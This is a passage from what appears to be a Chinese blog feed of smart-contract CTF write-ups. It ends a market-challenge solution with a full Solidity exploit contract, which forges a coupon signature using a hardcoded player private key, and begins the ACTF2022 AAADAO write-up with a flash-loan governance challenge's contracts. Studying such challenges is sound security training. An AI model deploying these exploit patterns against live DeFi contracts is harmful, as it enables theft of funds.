owner<span class="token punctuation">,</span>        <span class="token builtin">address</span> operator<span class="token punctuation">,</span>        <span class="token builtin">bool</span> approved    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> operator<span class="token punctuation">,</span> <span class="token string">"ERC721: approve to caller"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _operatorApprovals<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">[</span>operator<span class="token punctuation">]</span> <span class="token operator">=</span> approved<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getApproved</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span>        <span class="token keyword">public</span>        <span class="token keyword">view</span>        virtual        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isApprovedForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> operator<span class="token punctuation">)</span>        <span class="token keyword">public</span>        <span class="token keyword">view</span>        virtual        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token punctuation">{</span>        <span class="token function">_approve</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token punctuation">{</span>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> virtual <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_ownerOf</span><span class="token punctuation">(</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> owner<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">exploit</span> <span class="token keyword">is</span> Test <span class="token punctuation">{</span>    CtfMarket market <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtfMarket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    CtfToken token<span class="token punctuation">;</span>    CtfNFT nft<span class="token punctuation">;</span>    <span class="token builtin">address</span> attacker<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        token <span class="token operator">=</span> market<span class="token punctuation">.</span><span class="token function">ctfToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nft <span class="token operator">=</span> market<span class="token punctuation">.</span><span class="token function">ctfNFT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        attacker <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">testattack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        token<span class="token punctuation">.</span><span class="token function">airdrop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        token<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>        ENFT3 enft3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ENFT3</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        enft3<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span>attacker<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        enft3<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">createOrder</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>enft3<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ENFT2 enft2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ENFT2</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        enft2<span class="token punctuation">.</span><span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        enft2<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">purchaseTest</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>enft2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">purchaseOrder</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">purchaseOrder</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedCoupon <span class="token keyword">memory</span> scoupon <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>enft3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">purchaseWithCoupon</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">)</span><span class="token punctuation">;</span>        market<span class="token punctuation">.</span><span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">onERC721Received</span><span class="token punctuation">(</span>        <span class="token builtin">address</span><span class="token punctuation">,</span>        <span class="token builtin">address</span><span class="token punctuation">,</span>        <span class="token builtin">uint256</span><span class="token punctuation">,</span>        <span class="token builtin">bytes</span> <span class="token keyword">memory</span>    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onERC721Received<span class="token punctuation">.</span>selector<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token builtin">address</span> enftAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span>SignedCoupon <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> playerPrivateKey <span class="token operator">=</span> <span class="token number">0xb8305f5a0cacc7ade7f3aaa8702372307bdaaeb00e9447c85332284deec1477e</span><span class="token punctuation">;</span>        Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> <span class="token function">Coupon</span><span class="token punctuation">(</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xe14924eC3FA63F8FD6f0937c3Fbcf86242dce2De</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">""</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        Order <span class="token keyword">memory</span> order <span class="token operator">=</span> <span class="token function">Order</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>enftAddress<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> serialized <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>            <span class="token string">"I, the issuer"</span><span class="token punctuation">,</span>            coupon<span class="token punctuation">.</span>issuer<span class="token punctuation">,</span>            <span class="token string">"offer a special discount for"</span><span class="token punctuation">,</span>            coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span>            <span class="token string">"to buy"</span><span class="token punctuation">,</span>            order<span class="token punctuation">,</span>            <span class="token string">"at"</span><span class="token punctuation">,</span>            coupon<span class="token punctuation">.</span>newprice<span class="token punctuation">,</span>            <span class="token string">"because"</span><span class="token punctuation">,</span>            coupon<span class="token punctuation">.</span>reason        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">bytes32</span> digest <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token builtin">uint8</span> v<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> r<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> s<span class="token punctuation">)</span> <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>playerPrivateKey<span class="token punctuation">,</span> digest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> rs<span class="token punctuation">;</span>        rs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">;</span>        rs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">;</span>        Signature <span class="token keyword">memory</span> signature <span class="token operator">=</span> <span class="token function">Signature</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> rs<span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedCoupon <span class="token keyword">memory</span> scoupon <span class="token operator">=</span> <span class="token function">SignedCoupon</span><span class="token punctuation">(</span>coupon<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> scoupon<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，我们创建了两个NFT合约。刚开始的时候我是直接使用openzeppelin的库函数，后来发现合约大小超过了24KB于是只能一点点复制了。</p><p>其次，这里使用fonudry的vm功能对消息进行签名，但是在真实环境中没有这个功能，所以我们可以选择使用foundry在本地签名，将<code>(v, r, s)</code>作为参数传入。</p><p><img src="/../img/nitai.png"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>本题看起来非常长，逻辑难以理解，实际在读懂合约代码后，可以很清晰地将问题分为三个部分逐个击破。在合约逻辑中，<strong>未经检查的传入地址会给合约带来很大的风险</strong>，这一点在real world的hack事件中也是非常常见的。</p><p>这题没在比赛过程中做出来还是非常可惜的，还是思维不够灵活，希望以后可以多做题多积累积累经验。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2022 AAADAO</title>
      <link href="/2022/10/26/actf2022-aaadao/"/>
      <url>/2022/10/26/actf2022-aaadao/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF2022-AAADAO-复现"><a href="#ACTF2022-AAADAO-复现" class="headerlink" title="ACTF2022 AAADAO 复现"></a>ACTF2022 AAADAO 复现</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><h3 id="Deploy合约"><a href="#Deploy合约" class="headerlink" title="Deploy合约"></a>Deploy合约</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Deployer</span><span class="token punctuation">{</span>    <span class="token keyword">event</span> <span class="token function">Deploy</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> gov<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        AAA token<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">AAA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Gov gov<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Gov</span><span class="token punctuation">(</span><span class="token function">IVotes</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">,</span>token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">emit</span> <span class="token function">Deploy</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>gov<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先创造了一个ERC20 token，AAA。然后又创造了一个DAO，Gov。并将所有的AAA token都转到了Gov合约中。</p><p>解题条件是清空Gov合约中的所有token。</p><h3 id="Token合约"><a href="#Token合约" class="headerlink" title="Token合约"></a>Token合约</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./token/ERC20/extensions/ERC20Votes.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./interfaces/IERC3156FlashBorrower.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./interfaces/IERC3156FlashLender.sol"</span><span class="token punctuation">;</span><span class="token builtin">bytes32</span> <span class="token keyword">constant</span> _RETURN_VALUE <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"ERC3156FlashBorrower.onFlashLoan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AAA</span> <span class="token keyword">is</span> ERC20Votes<span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"AToken"</span><span class="token punctuation">,</span> <span class="token string">"AAA"</span><span class="token punctuation">)</span> <span class="token function">ERC20Permit</span><span class="token punctuation">(</span><span class="token string">"AToken"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">100000000</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">maxFlashLoan</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> token <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max <span class="token operator">-</span> ERC20<span class="token punctuation">.</span><span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">flashFee</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>token <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> fee<span class="token operator">=</span>amount<span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>fee<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> fee<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">flashLoan</span><span class="token punctuation">(</span>        IERC3156FlashBorrower receiver<span class="token punctuation">,</span>        <span class="token builtin">address</span> token<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> amount<span class="token punctuation">,</span>        <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> data    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">&lt;=</span> <span class="token function">maxFlashLoan</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> fee <span class="token operator">=</span> <span class="token function">flashFee</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>receiver<span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            receiver<span class="token punctuation">.</span><span class="token function">onFlashLoan</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> token<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> fee<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">==</span> _RETURN_VALUE        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_spendAllowance</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>receiver<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount <span class="token operator">+</span> fee<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_burn</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>receiver<span class="token punctuation">)</span><span class="token punctuation">,</span> amount <span class="token operator">+</span> fee<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到的是，合约实现了一个标准ERC20 token，并且还附带有ERC3156闪电贷功能，手续费为1%。</p><p><strong>同时还要求</strong></p><ul><li>receiver符合IERC3156FlashBorrower类型</li><li>receiver要实现onflashloan函数，并且返回_RETURN_VALUE</li><li>receiver要给Token合约授权<strong>amount+fee</strong>的额度</li></ul><h3 id="Gov合约"><a href="#Gov合约" class="headerlink" title="Gov合约"></a>Gov合约</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.2</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./interfaces/IERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./governance/Governor.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./governance/extensions/GovernorVotes.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./governance/extensions/GovernorCountingSimple.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./governance/extensions/GovernorVotesQuorumFraction.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Gov</span> <span class="token keyword">is</span> Governor<span class="token punctuation">,</span> GovernorVotes<span class="token punctuation">,</span>GovernorCountingSimple<span class="token punctuation">,</span>GovernorVotesQuorumFraction<span class="token punctuation">{</span>    <span class="token builtin">address</span> mytoken<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span>IVotes _token<span class="token punctuation">)</span>        <span class="token function">Governor</span><span class="token punctuation">(</span><span class="token string">"AAAGov"</span><span class="token punctuation">)</span>        <span class="token function">GovernorVotes</span><span class="token punctuation">(</span>_token<span class="token punctuation">)</span>        <span class="token function">GovernorVotesQuorumFraction</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        _token<span class="token punctuation">.</span><span class="token function">delegate</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mytoken<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span>_token<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">votingDelay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 1 day</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">votingPeriod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> override <span class="token 